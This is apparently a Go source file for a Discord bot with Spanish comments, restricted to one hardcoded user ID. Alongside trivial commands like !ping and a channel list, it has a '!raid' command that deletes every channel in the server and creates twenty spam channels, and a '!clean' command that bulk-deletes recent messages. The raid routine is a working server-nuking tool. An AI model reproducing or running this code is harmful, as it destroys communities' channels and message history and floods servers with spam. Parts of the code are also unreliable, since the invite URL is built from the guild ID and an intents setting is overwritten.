package main

import (
	"encoding/json"
	"fmt"
	"github.com/joho/godotenv"
	"log"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"

	"github.com/bwmarrin/discordgo"
)

func main() {
	// Cargar variables de entorno desde el archivo .env
	err := godotenv.Load()
	if err != nil {
		log.Fatalf("Error cargando el archivo .env: %v", err)
	}

	// Obtener el token de Discord desde las variables de entorno
	DISCORD_TOKEN := os.Getenv("DISCORD_TOKEN")
	if DISCORD_TOKEN == "" {
		log.Fatalf("DISCORD_TOKEN no está definido en el archivo .env")
	}
	
	// Crea una nueva sesión de Discord usando el token del bot
	dg, err := discordgo.New("Bot " + DISCORD_TOKEN )
	if err != nil {
		fmt.Println("Error creando sesión de Discord,", err)
		return
	}

	// Activar intents para recibir eventos de mensajes
	dg.Identify.Intents = discordgo.IntentsGuildMessages | discordgo.IntentsDirectMessages

	// Registra una función de callback para cuando el bot reciba un mensaje
	dg.AddHandler(messageCreate)

	// In this example, we only care about receiving message events.
	dg.Identify.Intents = discordgo.IntentsGuildMessages

	// Abre una conexión WebSocket al servidor de Discord
	err = dg.Open()
	if err != nil {
		fmt.Println("Error abriendo conexión,", err)
		return
	}

	fmt.Println("Bot está corriendo. Presiona CTRL+C para salir.")

	// Espera hasta que se interrumpa el programa (CTRL+C)
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	// Cierra la sesión cuando termine el programa
	dg.Close()
}

// Función que se llama cada vez que el bot recibe un mensaje
func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignora mensajes enviados por el mismo bot
	if m.Author.ID == s.State.User.ID {
		return
	}
	if len(m.Content) > 0 && m.Content[0] == '!' && m.Author.ID != "797728978420891668" {
		s.ChannelMessageDelete(m.ChannelID, m.ID)
		s.ChannelMessageSend(m.ChannelID, "No tienes permiso para usar el bot")
		return
	}

	if len(m.Content) > 0 && m.Content[0] == '!' {
		// Crear un mapa para almacenar el autor y el contenido del mensaje
		newMessage := map[string]string{
			"author":  m.Author.Username,
			"content": m.Content,
		}

		// Convertir el mapa a JSON
		jsonData, err := json.Marshal(newMessage)
		if err != nil {
			fmt.Println("Error convirtiendo el mapa a JSON:", err)
			return
		}

		// Imprimir el JSON
		fmt.Println(string(jsonData))
	}

	// Si el mensaje es "!ping", responde con "Pong!"
	if m.Content == "!ping" {
		s.ChannelMessageSend(m.ChannelID, "Pong!")
		err := s.ChannelMessageDelete(m.ChannelID, m.ID)
		if err != nil {
			fmt.Println("Error al eliminar el mensaje:", err)
		}
		return
	}

	if m.Content == "!clean" {
		// Obtener los mensajes más recientes del canal
		messages, err := s.ChannelMessages(m.ChannelID, 100, "", "", "")
		if err != nil {
			log.Println("Error obteniendo mensajes:", err)
			return
		}

		// Extraer los IDs de los mensajes
		var messageIDs []string
		for _, msg := range messages {
			messageIDs = append(messageIDs, msg.ID)
		}

		// Eliminar los mensajes en bloque
		if len(messageIDs) > 0 {
			err = s.ChannelMessagesBulkDelete(m.ChannelID, messageIDs)
			if err != nil {
				log.Println("Error eliminando mensajes:", err)
				return
			}
		} else {
			s.ChannelMessage(m.ChannelID, "No hay mensajes que eliminar")
		}

		// Enviar mensaje de confirmación
		_, err = s.ChannelMessageSend(m.ChannelID, "CP eliminado exitosamente!")
		if err != nil {
			log.Println("Error enviando mensaje de confirmación:", err)
		}
	}

	if m.Content == "!channels" {
		// Obtener canales del servidor
		channels, err := s.GuildChannels(m.GuildID)
		if err != nil {
			log.Println("Error obteniendo canales:", err)
			s.ChannelMessageSend(m.ChannelID, "Hubo un error al obtener los canales.")
			return
		}

		// Construir el mensaje con los nombres de los canales
		var builder strings.Builder
		builder.WriteString("Channels:\n")
		for _, channel := range channels {
			builder.WriteString(channel.Name + "\n")
		}

		// Enviar el mensaje con todos los nombres de los canales
		_, err = s.ChannelMessageSend(m.ChannelID, builder.String())
		if err != nil {
			log.Println("Error enviando el mensaje:", err)
		}
	}

	if m.Content == "!raid" {
		deleteChannels(s, m)
		for i := 0; i < 20; i++ {
			createChannels(s, m)
		}
	}
	if m.Content == "!clean channels" {
		deleteChannels(s, m)
	}
}

func deleteChannels(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Obtener canales del servidor
	channels, err := s.GuildChannels(m.GuildID)
	if err != nil {
		log.Println("Error obteniendo canales:", err)
		s.ChannelMessageSend(m.ChannelID, "Hubo un error al obtener los canales.")
		return
	}

	// Crear un WaitGroup para sincronizar las goroutines
	var wg sync.WaitGroup
	wg.Add(len(channels))

	// Eliminar canales en paralelo
	for _, channel := range channels {
		go func(channelID string) {
			defer wg.Done()
			_, err := s.ChannelDelete(channelID)
			if err != nil {
				log.Printf("Error eliminando el canal %s: %v", channelID, err)
			}
		}(channel.ID)
	}

	// Esperar a que todas las goroutines terminen
	wg.Wait()

	// Notificar que el proceso ha terminado
	_, err = fmt.Println("Todos los canales han sido eliminados.")
	if err != nil {
		log.Println("Error enviando el mensaje de confirmación:", err)
	}
}

func createChannels(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Crear un nuevo canal de texto en el servidor
	channel, err := s.GuildChannelCreate(m.GuildID, "Chocano te está bailando", discordgo.ChannelTypeGuildText)
	if err != nil {
		log.Println("Error creando el canal:", err)
		return
	}

	// Construir la URL del ícono del servidor
	guild, err := s.Guild(m.GuildID)
	if err != nil {
		log.Println("Error obteniendo el servidor:", err)
		return
	}
	iconURL := "https://cdn.discordapp.com/icons/" + m.GuildID + "/" + guild.Icon + ".png"

	// Construir el enlace de invitación usando una URL predefinida
	inviteURL := "https://discord.gg/" + m.GuildID // Esta URL puede necesitar ajustes según los permisos y configuración

	// Enviar un mensaje al nuevo canal con la información
	message := "¡Bienvenido al nuevo canal!\n\n" +
		"Información del servidor:\n" +
		"Nombre: " + guild.Name + "\n" +
		"Ícono: " + iconURL + "\n\n" +
		"Únete a nuestro servidor aquí: " + inviteURL

	_, err = s.ChannelMessageSend(channel.ID, message)
	if err != nil {
		log.Println("Error enviando el mensaje:", err)
	}

}
